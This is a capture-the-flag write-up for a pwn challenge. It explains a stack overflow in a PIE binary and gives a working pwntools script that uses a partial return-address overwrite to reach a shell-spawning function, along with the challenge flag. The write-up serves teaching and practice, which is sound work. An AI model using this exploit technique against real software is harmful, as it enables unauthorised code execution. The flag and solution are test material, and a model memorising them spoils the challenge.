# Try More — Writeup

**Category:** PWN  
**Flag:** `ictf{aslR-1s-n0t-always-th@t-b@d}`

---

## Overview

A classic stack buffer overflow challenge — but the binary is compiled as a PIE (Position Independent Executable) and runs under ASLR, so addresses are randomized at each execution.

---

## Vulnerability

In `vuln()`, a 32-byte stack buffer is read into with up to 256 bytes:

```c
void vuln(void) {
    char buf[32];
    puts("Tell me your name and I'll say hello!");
    printf("> ");
    read(STDIN_FILENO, buf, 256);   // reads 256 bytes into 32-byte buffer
    printf("Hello, %s!\n", buf);
}
```

The target function `win()` calls `execve("/bin/bash", ...)`, giving an interactive shell.

```c
void win(void) {
    printf("Good job :D\n");
    static char *args[] = {"/bin/bash", "-i", NULL};
    execve("/bin/bash", args, NULL);
    _exit(0);
}
```

---

## Stack Layout

```
[ buf   (32 bytes) ]
[ rbp   ( 8 bytes) ]
[ rip   ( 8 bytes) ]  ← target: redirect to win()
```

The offset from the start of `buf` to the saved RIP is **40 bytes**.

---

## The ASLR / PIE Problem

PIE + ASLR randomizes the entire binary base address on each execution. The full address of `win()` changes every run. However, **the low 12 bits of an address are always fixed** (they come from the binary layout, not the ASLR slide). The low **16 bits** include 12 bits of fixed offset plus 4 bits of ASLR entropy (the ASLR slide is page-aligned).

Strategy: overwrite only the **low 2 bytes** of the saved RIP with `win()`'s low 16 bits from the ELF. On average, 1 in 16 attempts will hit the correct ASLR slide.

---

## Exploit

```python
from pwn import *

BINARY = "./try_more"
elf = ELF(BINARY)

RIP_OFFSET = 40
win_low16 = elf.symbols["win"] & 0xFFFF

def try_once(host, port):
    io = remote(host, port, level='warn')
    payload = b"A" * RIP_OFFSET + p16(win_low16)
    io.sendafter(b"> ", payload)
    try:
        io.recvuntil(b"Good", timeout=2)
        io.interactive()
        return True
    except Exception:
        io.close()
        return False

attempt = 0
while True:
    attempt += 1
    print(f"Attempt #{attempt}")
    if try_once("challenge-host", 4445):
        break
```

The loop retries until the ASLR slide aligns — typically within ~16 attempts.

---

## Key Insight

ASLR does not fully protect a PIE binary when only the **low bytes** of the return address are overwritten. The `read()` syscall writes exactly as many bytes as the payload specifies — only 2 bytes past the offset — so the upper bytes of RIP remain from the original return address (same ASLR base), and only the low 16 bits are replaced. This is a **partial overwrite** attack, and it works probabilistically.

---

## Flag

`ictf{aslR-1s-n0t-always-th@t-b@d}`
